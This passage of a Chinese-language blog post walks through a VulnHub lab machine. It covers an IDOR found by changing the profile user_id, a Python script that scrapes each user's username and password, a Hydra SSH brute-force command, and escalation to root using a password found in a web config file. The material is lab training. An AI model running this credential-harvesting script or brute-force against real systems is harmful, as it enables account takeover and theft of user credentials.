src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007104828.png\" alt=\"\"></p>\n<p>登录框没啥发现，注册个账号看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007105114.png\" alt=\"\"></p>\n<p>观察到url的id号，那修改id看下是否能越权，发现确实存在</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007105225.png\" alt=\"\"></p>\n<p>密码虽然是星号，但是可以在源码处查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007105633.png\" alt=\"\"></p>\n<p>burp爆破了一下，大概有这么几个id</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007110207.png\" alt=\"\"></p>\n<h3 id=\"抓取用户名和密码\"><a href=\"#抓取用户名和密码\" class=\"headerlink\" title=\"抓取用户名和密码\"></a>抓取用户名和密码</h3><p>数目少可以手动，但写个脚本还是要方便一些</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">file1 = open(<span class=\"string\">'file.txt'</span>,<span class=\"string\">'w'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">15</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    url = <span class=\"string\">'http://192.168.126.133/?page=profile&amp;user_id=&#123;&#125;'</span>.format(i)</span><br><span class=\"line\">    header = &#123;</span><br><span class=\"line\">        <span class=\"string\">'Host'</span>: <span class=\"string\">'192.168.126.133'</span>,</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'</span>,</span><br><span class=\"line\">        <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class=\"line\">        <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'en-US,en;q=0.5'</span>,</span><br><span class=\"line\">        <span class=\"string\">'Accept-Encoding'</span>: <span class=\"string\">'gzip, deflate'</span>,</span><br><span class=\"line\">        <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</span><br><span class=\"line\">        <span class=\"string\">'Cookie'</span>: <span class=\"string\">'PHPSESSID=o76t4q433u9e3b639dvkace4c7'</span>,</span><br><span class=\"line\">        <span class=\"string\">'Upgrade-Insecure-Requests'</span>: <span class=\"string\">'1'</span>,</span><br><span class=\"line\">        <span class=\"string\">'X-Forwarded-For'</span>: <span class=\"string\">'127.0.0.1'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res = requests.get(url=url,headers=header).text</span><br><span class=\"line\">    soup = BeautifulSoup(res,<span class=\"string\">'html.parser'</span>)</span><br><span class=\"line\">    target = soup.find(id=<span class=\"string\">\"username\"</span>)</span><br><span class=\"line\">    target2 = soup.find(id=<span class=\"string\">'password'</span>)</span><br><span class=\"line\">    username = target.attrs[<span class=\"string\">'value'</span>]</span><br><span class=\"line\">    password = target2.attrs[<span class=\"string\">'value'</span>]</span><br><span class=\"line\">    print(str(i),file=file1)</span><br><span class=\"line\">    print(username,file=file1)</span><br><span class=\"line\">    print(password,file=file1)</span><br></pre></td></tr></table></figure>\n\n<p>得到的内容整理一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007154726.png\" alt=\"\"></p>\n<h3 id=\"爆破ssh登录\"><a href=\"#爆破ssh登录\" class=\"headerlink\" title=\"爆破ssh登录\"></a>爆破ssh登录</h3><p>之前已经扫到22端口是开放的，有了这些用户名和密码，尝试爆破</p>\n<p>使用hydra，首先把得到的用户名和密码分开</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007154956.png\" alt=\"\"></p>\n<p>执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hydra -L u.txt -P p.txt -v 192.168.126.133 ssh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007155647.png\" alt=\"\"></p>\n<p>成功得到用户名密码，那么ssh登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007155833.png\" alt=\"\"></p>\n<h3 id=\"获取flag\"><a href=\"#获取flag\" class=\"headerlink\" title=\"获取flag\"></a>获取flag</h3><p>题目里说是有两个flag，首先根目录执行<code>find / -name &quot;flag*&quot;</code>看下能不能找出来</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007160243.png\" alt=\"\"></p>\n<p>找到一个</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007160408.png\" alt=\"\"></p>\n<p>继续翻，在网站目录下找到个config，查看疑似root密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007160507.png\" alt=\"\"></p>\n<p>尝试登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007160535.png\" alt=\"\"></p>\n<p>成功获取root权限，继续执行查找flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007160642.png\" alt=\"\"></p>\n<p>查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007160752.png\" alt=\"\"></p>\n<p>完成</p>\n","categories":["vulnhub"],"tags":["hydra"]}]